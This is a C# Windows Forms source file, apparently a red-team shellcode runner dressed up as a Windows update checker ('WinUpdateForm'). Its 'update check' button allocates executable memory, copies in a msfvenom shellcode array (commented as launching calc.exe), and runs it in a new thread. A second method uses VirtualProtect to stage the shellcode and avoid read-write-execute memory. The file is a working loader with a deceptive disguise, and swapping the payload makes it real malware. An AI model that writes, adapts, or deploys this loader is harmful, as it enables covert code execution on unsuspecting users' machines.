using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ShellLauncher
{
    public partial class WinUpdateForm : Form
    {
        public enum Protection
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        Protection flNewProtect, out Protection lpflOldProtect);

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, Protection flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(
              UInt32 lpAddress,
              UIntPtr dwSize,
               IntPtr param,
              out uint lpflOldProtect
            );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static UInt32 MEM_COMMIT = 0x1000;
        //private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        //private static UInt32 PAGE_READWRITE = 0x04;


        public WinUpdateForm()
        {
            InitializeComponent();
        }

        private void UdpateCheck_Click(object sender, EventArgs e)
        {
            ExecShell();
        }

        private void ExecShell()
        {
            //msfvenom -p windows/exec cmd=calc.exe -f psh
            byte[] shell = new byte[]{
0xbb,0x48,0x67,0xc7,0xe2,0xdb,0xca,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x54,0x83,0xee,0xfc,0x31,0x5e,0xf,0x3,0x5e,0x47,0x85,0x32,0x1e,0xbf,0xcb,0xbd,0xdf,0x3f,0xac,0x34,0x3a,0xe,0xec,0x23,0x4e,0x20,0xdc,0x20,0x2,0xcc,0x97,0x65,0xb7,0x47,0xd5,0xa1,0xb8,0xe0,0x50,0x94,0xf7,0xf1,0xc9,0xe4,0x96,0x71,0x10,0x39,0x79,0x48,0xdb,0x4c,0x78,0x8d,0x6,0xbc,0x28,0x46,0x4c,0x13,0xdd,0xe3,0x18,0xa8,0x56,0xbf,0x8d,0xa8,0x8b,0x77,0xaf,0x99,0x1d,0xc,0xf6,0x39,0x9f,0xc1,0x82,0x73,0x87,0x6,0xae,0xca,0x3c,0xfc,0x44,0xcd,0x94,0xcd,0xa5,0x62,0xd9,0xe2,0x57,0x7a,0x1d,0xc4,0x87,0x9,0x57,0x37,0x35,0xa,0xac,0x4a,0xe1,0x9f,0x37,0xec,0x62,0x7,0x9c,0xd,0xa6,0xde,0x57,0x1,0x3,0x94,0x30,0x5,0x92,0x79,0x4b,0x31,0x1f,0x7c,0x9c,0xb0,0x5b,0x5b,0x38,0x99,0x38,0xc2,0x19,0x47,0xee,0xfb,0x7a,0x28,0x4f,0x5e,0xf0,0xc4,0x84,0xd3,0x5b,0x80,0x69,0xde,0x63,0x50,0xe6,0x69,0x17,0x62,0xa9,0xc1,0xbf,0xce,0x22,0xcc,0x38,0x31,0x19,0xa8,0xd7,0xcc,0xa2,0xc9,0xfe,0xa,0xf6,0x99,0x68,0xbb,0x77,0x72,0x69,0x44,0xa2,0xef,0x63,0xd2,0x8d,0x58,0x73,0x44,0x66,0x9b,0x74,0x89,0xcd,0x12,0x92,0xd9,0x61,0x75,0xb,0x99,0xd1,0x35,0xfb,0x71,0x38,0xba,0x24,0x61,0x43,0x10,0x4d,0xb,0xac,0xcd,0x25,0xa3,0x55,0x54,0xbd,0x52,0x99,0x42,0xbb,0x54,0x11,0x67,0x3b,0x1a,0xd2,0x2,0x2f,0x4a,0x83,0xec,0xaf,0x8a,0x2e,0xed,0xc5,0x8e,0xf8,0xba,0x71,0x8c,0xdd,0x8d,0xdd,0x6f,0x8,0x8e,0x1a,0x8f,0xcd,0xa7,0x51,0xb9,0x5b,0x88,0xd,0xc5,0x8b,0x8,0xce,0x93,0xc1,0x8,0xa6,0x43,0xb2,0x5a,0xd3,0x8c,0x6f,0xcf,0x48,0x18,0x90,0xa6,0x3d,0x8b,0xf8,0x44,0x1b,0xfb,0xa6,0xb7,0x4e,0x78,0xa0,0x48,0xc,0x5c,0x9,0x21,0xee,0xe0,0xa9,0xb1,0x84,0xe0,0xf9,0xd9,0x53,0xcf,0xf6,0x29,0x9b,0xda,0x5e,0x22,0x16,0x8a,0x2d,0xd3,0x27,0x87,0xf0,0x4d,0x27,0x2b,0x29,0x9b,0xa6,0xcc,0xce,0xa4,0x48,0xf1,0x18,0x9d,0x3e,0x32,0x99,0x9a,0x31,0x9,0xbc,0x8b,0xdb,0x71,0x92,0xcc,0xc9
            };
            IntPtr hThread = IntPtr.Zero;
            IntPtr pinfo = IntPtr.Zero;
            UInt32 threadId = 0;

            UInt32 addrmemExec = VirtualAlloc(0, (UInt32)shell.Length, MEM_COMMIT, Protection.PAGE_EXECUTE_READWRITE);
            //writes our shellcode into the allocated memory
            Marshal.Copy(shell, 0, (IntPtr)addrmemExec, shell.Length);

            CreateThread(0, 0, addrmemExec, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }

        private void VprotectExecShell()
        {
            Protection old = Protection.PAGE_READWRITE;
            //msfvenom -p windows/exec cmd=calc.exe -f psh
            byte[] shell = new byte[]{
0xbb,0x48,0x67,0xc7,0xe2,0xdb,0xca,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x54,0x83,0xee,0xfc,0x31,0x5e,0xf,0x3,0x5e,0x47,0x85,0x32,0x1e,0xbf,0xcb,0xbd,0xdf,0x3f,0xac,0x34,0x3a,0xe,0xec,0x23,0x4e,0x20,0xdc,0x20,0x2,0xcc,0x97,0x65,0xb7,0x47,0xd5,0xa1,0xb8,0xe0,0x50,0x94,0xf7,0xf1,0xc9,0xe4,0x96,0x71,0x10,0x39,0x79,0x48,0xdb,0x4c,0x78,0x8d,0x6,0xbc,0x28,0x46,0x4c,0x13,0xdd,0xe3,0x18,0xa8,0x56,0xbf,0x8d,0xa8,0x8b,0x77,0xaf,0x99,0x1d,0xc,0xf6,0x39,0x9f,0xc1,0x82,0x73,0x87,0x6,0xae,0xca,0x3c,0xfc,0x44,0xcd,0x94,0xcd,0xa5,0x62,0xd9,0xe2,0x57,0x7a,0x1d,0xc4,0x87,0x9,0x57,0x37,0x35,0xa,0xac,0x4a,0xe1,0x9f,0x37,0xec,0x62,0x7,0x9c,0xd,0xa6,0xde,0x57,0x1,0x3,0x94,0x30,0x5,0x92,0x79,0x4b,0x31,0x1f,0x7c,0x9c,0xb0,0x5b,0x5b,0x38,0x99,0x38,0xc2,0x19,0x47,0xee,0xfb,0x7a,0x28,0x4f,0x5e,0xf0,0xc4,0x84,0xd3,0x5b,0x80,0x69,0xde,0x63,0x50,0xe6,0x69,0x17,0x62,0xa9,0xc1,0xbf,0xce,0x22,0xcc,0x38,0x31,0x19,0xa8,0xd7,0xcc,0xa2,0xc9,0xfe,0xa,0xf6,0x99,0x68,0xbb,0x77,0x72,0x69,0x44,0xa2,0xef,0x63,0xd2,0x8d,0x58,0x73,0x44,0x66,0x9b,0x74,0x89,0xcd,0x12,0x92,0xd9,0x61,0x75,0xb,0x99,0xd1,0x35,0xfb,0x71,0x38,0xba,0x24,0x61,0x43,0x10,0x4d,0xb,0xac,0xcd,0x25,0xa3,0x55,0x54,0xbd,0x52,0x99,0x42,0xbb,0x54,0x11,0x67,0x3b,0x1a,0xd2,0x2,0x2f,0x4a,0x83,0xec,0xaf,0x8a,0x2e,0xed,0xc5,0x8e,0xf8,0xba,0x71,0x8c,0xdd,0x8d,0xdd,0x6f,0x8,0x8e,0x1a,0x8f,0xcd,0xa7,0x51,0xb9,0x5b,0x88,0xd,0xc5,0x8b,0x8,0xce,0x93,0xc1,0x8,0xa6,0x43,0xb2,0x5a,0xd3,0x8c,0x6f,0xcf,0x48,0x18,0x90,0xa6,0x3d,0x8b,0xf8,0x44,0x1b,0xfb,0xa6,0xb7,0x4e,0x78,0xa0,0x48,0xc,0x5c,0x9,0x21,0xee,0xe0,0xa9,0xb1,0x84,0xe0,0xf9,0xd9,0x53,0xcf,0xf6,0x29,0x9b,0xda,0x5e,0x22,0x16,0x8a,0x2d,0xd3,0x27,0x87,0xf0,0x4d,0x27,0x2b,0x29,0x9b,0xa6,0xcc,0xce,0xa4,0x48,0xf1,0x18,0x9d,0x3e,0x32,0x99,0x9a,0x31,0x9,0xbc,0x8b,0xdb,0x71,0x92,0xcc,0xc9
            };
            IntPtr hThread = IntPtr.Zero;
            IntPtr pinfo = IntPtr.Zero;
            UInt32 threadId = 0;

            //allocating memory with readwrite permission
            UInt32 addrmemExec = VirtualAlloc(0, (UInt32)shell.Length, MEM_COMMIT, Protection.PAGE_READWRITE);
            //writes our shellcode into the allocated memory
            Marshal.Copy(shell, 0, (IntPtr)addrmemExec, shell.Length);
            //changes the allocated memory permission to read and execute
            if (VirtualProtect((IntPtr)addrmemExec, (uint)(shell.Length), Protection.PAGE_EXECUTE_READ, out old))
            {
                CreateThread(0, 0, addrmemExec, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            else
            {
                GetLastError();
            }


        }
    }
}
